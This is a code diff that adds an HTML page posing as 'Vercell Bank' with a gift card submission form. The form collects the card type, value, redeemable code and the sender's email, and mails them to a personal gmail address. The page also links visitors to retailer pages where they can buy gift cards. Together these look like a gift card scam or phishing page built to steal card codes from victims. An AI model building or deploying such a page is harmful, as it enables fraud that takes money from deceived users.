@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Gift Card Submission - Vercell Bank</title>
+  <style>
+    body {
+      background-color: #0f172a;
+      color: #f8fafc;
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+      background-color: #1e293b;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
+    }
+
+    h1 {
+      text-align: center;
+      margin-bottom: 25px;
+      color: #60a5fa;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      color: #cbd5e1;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px;
+      font-size: 1rem;
+      background-color: #1f2937;
+      border: 1px solid #334155;
+      border-radius: 10px;
+      color: #f1f5f9;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #3b82f6;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-weight: bold;
+      font-size: 1rem;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background-color: #2563eb;
+    }
+
+    p.note {
+      font-size: 0.95rem;
+      margin-top: 15px;
+      color: #fbbf24;
+      text-align: center;
+    }
+
+    .back-link {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .back-link a {
+      color: #60a5fa;
+      text-decoration: none;
+    }
+
+    .back-link a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Submit Gift Card</h1>
+    <form id="giftcardForm" action="mailto:vercellbank@gmail.com" method="POST" enctype="text/plain">
+      <div class="form-group">
+        <label for="cardType">Select Gift Card Type</label>
+        <select id="cardType" name="Gift Card Type" required>
+          <option value="">-- Select --</option>
+          <option value="Amazon">Amazon</option>
+          <option value="iTunes">iTunes</option>
+          <option value="Steam">Steam</option>
+          <option value="Walmart">Walmart</option>
+          <option value="Google Play">Google Play</option>
+          <option value="Other">Other</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label for="value">Card Value ($)</label>
+        <input type="number" id="value" name="Card Value" required />
+      </div>
+
+      <div class="form-group">
+        <label for="cardNumber">Gift Card Code</label>
+        <input type="text" id="cardNumber" name="Gift Card Code" required />
+      </div>
+
+      <div class="form-group">
+        <label for="userEmail">Your Email</label>
+        <input type="email" id="userEmail" name="Sender Email" required />
+      </div>
+
+      <button type="submit">Submit Gift Card</button>
+    </form>
+
+    <p class="note">This gift card will be verified by Vercell Bank. Please ensure accuracy before submission.</p>
+
+    <div class="back-link">
+      <a href="dashboard.html">← Back to Dashboard</a>
+    </div>
+  </div><br>
+<center> Buy Gift Cards</center>
+
+<div style="overflow-x: auto; white-space: nowrap; padding: 10px 0;">
+  <div style="display: inline-block; background-color: #1e293b; color: #f8fafc; padding: 20px; margin-right: 10px; border-radius: 12px; min-width: 150px; text-align: center; box-shadow: 0 0 10px rgba(0,0,0,0.2);">
+    <a href="https://www.amazon.com/gift-cards" target="_blank" style="text-decoration: none; color: #60a5fa;">Amazon</a>
+  </div>
+  <div style="display: inline-block; background-color: #1e293b; color: #f8fafc; padding: 20px; margin-right: 10px; border-radius: 12px; min-width: 150px; text-align: center; box-shadow: 0 0 10px rgba(0,0,0,0.2);">
+    <a href="https://www.itunes.com/gift-cards" target="_blank" style="text-decoration: none; color: #60a5fa;">iTunes</a>
+  </div>
+  <div style="display: inline-block; background-color: #1e293b; color: #f8fafc; padding: 20px; margin-right: 10px; border-radius: 12px; min-width: 150px; text-align: center; box-shadow: 0 0 10px rgba(0,0,0,0.2);">
+    <a href="https://store.steampowered.com/digitalgiftcards/" target="_blank" style="text-decoration: none; color: #60a5fa;">Steam</a>
+  </div>
+  <div style="display: inline-block; background-color: #1e293b; color: #f8fafc; padding: 20px; margin-right: 10px; border-radius: 12px; min-width: 150px; text-align: center; box-shadow: 0 0 10px rgba(0,0,0,0.2);">
+    <a href="https://www.walmart.com/cp/gift-cards/96894" target="_blank" style="text-decoration: none; color: #60a5fa;">Walmart</a>
+  </div>
+  <div style="display: inline-block; background-color: #1e293b; color: #f8fafc; padding: 20px; margin-right: 10px; border-radius: 12px; min-width: 150px; text-align: center; box-shadow: 0 0 10px rgba(0,0,0,0.2);">
+    <a href="https://play.google.com/about/giftcards/" target="_blank" style="text-decoration: none; color: #60a5fa;">Google Play</a>
+  </div>
+  <div style="display: inline-block; background-color: #1e293b; color: #f8fafc; padding: 20px; margin-right: 10px; border-radius: 12px; min-width: 150px; text-align: center; box-shadow: 0 0 10px rgba(0,0,0,0.2);">
+    <a href="https://www.target.com/c/gift-cards/-/N-5xsxu" target="_blank" style="text-decoration: none; color: #60a5fa;">Target</a>
+  </div>
+  <div style="display: inline-block; background-color: #1e293b; color: #f8fafc; padding: 20px; margin-right: 10px; border-radius: 12px; min-width: 150px; text-align: center; box-shadow: 0 0 10px rgba(0,0,0,0.2);">
+    <a href="https://www.bestbuy.com/site/gift-cards" target="_blank" style="text-decoration: none; color: #60a5fa;">Best Buy</a>
+  </div>
+  <div style="display: inline-block; background-color: #1e293b; color: #f8fafc; padding: 20px; margin-right: 10px; border-radius: 12px; min-width: 150px; text-align: center; box-shadow: 0 0 10px rgba(0,0,0,0.2);">
+    <a href="https://www.ebay.com/giftcards" target="_blank" style="text-decoration: none; color: #60a5fa;">eBay</a>
+  </div>
+</div>
+
+
+</body>
+</html>
